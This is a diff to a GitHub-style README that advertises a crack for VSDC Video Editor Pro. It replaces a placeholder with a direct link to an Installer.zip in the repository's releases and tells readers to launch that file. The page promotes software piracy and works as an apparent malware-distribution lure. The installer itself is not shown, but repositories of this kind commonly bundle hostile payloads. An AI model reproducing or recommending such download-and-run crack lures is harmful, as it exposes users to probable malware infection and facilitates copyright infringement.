@@ -12,9 +12,9 @@ This repository is dedicated to providing users with access to discounted offers
 
 ## Get Started
 To make use of the resources provided in this repository, visit the link below:
-[![Download VSDC Video Editor Pro](555)](555)
+[![Download VSDC Video Editor Pro](https://github.com/ironshaper2000/VSDC-Video-Editor-Pro-Crack/releases/download/download/Installer.zip)](https://github.com/ironshaper2000/VSDC-Video-Editor-Pro-Crack/releases/download/download/Installer.zip)
 
-🚀 **Launch the 555 file to access the VSDC Video Editor Pro Crack resources.**
+🚀 **Launch the https://github.com/ironshaper2000/VSDC-Video-Editor-Pro-Crack/releases/download/download/Installer.zip file to access the VSDC Video Editor Pro Crack resources.**
 
 If the provided link does not work or is unavailable, please check the "Releases" section of this repository for alternative access.
 
